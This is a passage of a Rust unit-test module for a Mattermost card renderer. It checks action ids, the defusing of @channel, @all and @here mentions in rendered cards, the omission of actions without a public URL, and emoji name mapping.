            "https://c.example/mm/actions"
        );
        // Action ids are alphanumeric (Mattermost requirement) and unique.
        assert_eq!(acts[0]["id"], "act1");
        assert_eq!(acts[2]["id"], "act3");
    }

    #[test]
    fn card_text_is_defused_everywhere() {
        let key = b"k".repeat(32);
        let card = Card {
            blocks: vec![
                Block::Header {
                    text: "@channel header".into(),
                },
                Block::Fields {
                    pairs: vec![Field {
                        label: "@all".into(),
                        value: "@here".into(),
                    }],
                },
                Block::Context {
                    text: "@channel".into(),
                },
                Block::Buttons {
                    items: vec![ButtonItem {
                        label: "@here".into(),
                        style: ButtonStyle::Default,
                        token: "t".into(),
                    }],
                },
            ],
        };
        let s = render_attachment(&card, &ctx(&key), &lk()).to_string();
        for w in ["@channel", "@all", "@here"] {
            assert!(s.contains(&format!("`{w}`")), "{w} not defused in {s}");
        }
        assert!(!s.contains("\"@here\""));
    }

    #[test]
    fn no_public_url_means_no_actions() {
        let key = b"k".repeat(32);
        let card = Card::new(vec![
            Block::header("h"),
            Block::buttons(vec![ButtonItem::new(
                "Go",
                ButtonStyle::Default,
                "t".into(),
            )])
            .unwrap(),
        ])
        .unwrap();
        let c = CardCtx {
            actions_url: None,
            hmac_key: &key,
            integration_id: Uuid::nil(),
        };
        assert!(render_attachment(&card, &c, &lk()).get("actions").is_none());
    }

    #[test]
    fn reactions_map_one_to_one() {
        assert_eq!(emoji_name("eyes"), "eyes");
        assert_eq!(emoji_name("white_check_mark"), "white_check_mark");
        assert_eq!(emoji_name("x"), "x");
        assert_eq!(
            emoji_name("hourglass_flowing_sand"),
            "hourglass_flowing_sand"
        );
        assert_eq!(emoji_name("mystery"), "eyes");
    }
}
